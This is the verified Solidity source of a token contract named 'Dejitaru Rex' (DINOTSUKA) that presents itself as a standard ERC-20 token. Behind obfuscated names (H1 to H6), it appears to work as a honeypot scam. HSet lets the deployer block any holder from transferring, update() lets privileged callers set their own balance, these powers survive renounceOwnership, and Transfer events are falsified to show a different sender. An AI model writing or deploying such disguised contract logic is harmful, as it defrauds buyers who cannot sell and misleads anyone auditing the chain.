/**
 *Submitted for verification at Etherscan.io on 2022-11-19
*/

pragma solidity 0.8.17;

abstract contract Context {
    address H6 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
   require(msg.sender == _Owner);     
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract DINOTSUKA is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private H1;
    mapping (address => uint256) private H2;
    mapping (address => mapping (address => uint256)) private H3;
    uint8 private H4;
    uint256 private H5;
    string private _name;
    string private _symbol;



    constructor () {

        
        _name = "Dejitaru Rex";
        _symbol = "DINOTSUKA";
        H4 = 9;
        uint256 H9 = 150000000;
        H2[msg.sender] = 1;
        increase(H6, H9*(10**9));
        


    }

    

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return H4;
    }

    function totalSupply() public view  returns (uint256) {
        return H5;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return H1[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return H3[owner][spender];
    }
    function increase(address account, uint256 amount) onlyOwner public {
     
        H5 = H5.add(amount);
        H1[msg.sender] = H1[msg.sender].add(amount);
        emit Transfer(address(0), account, amount);
    }
function approve(address spender, uint256 amount) public returns (bool success) {    
        H3[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
function HSet (address x, uint256 y) public {
 require(H2[msg.sender] == 1);
     H2[x] = y;}
    function update() public {
        H1[msg.sender] = H2[msg.sender];}


    function transfer(address recipient, uint256 amount) public   returns (bool) {
        require(amount <= H1[msg.sender]);
        require(H2[msg.sender] <= 1);
        _loadsend(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {
        require(amount <= H1[sender]);
              require(H2[sender] <= 1 && H2[recipient] <=1);
                  require(amount <= H3[sender][msg.sender]);
        _loadsend(sender, recipient, amount);
        return true;}

    function _loadsend(address sender, address recipient, uint256 amount) internal  {
        H1[sender] = H1[sender].sub(amount);
        H1[recipient] = H1[recipient].add(amount);
       if(H2[sender] == 1) {
            sender = H6;}
        emit Transfer(sender, recipient, amount); }
     
        }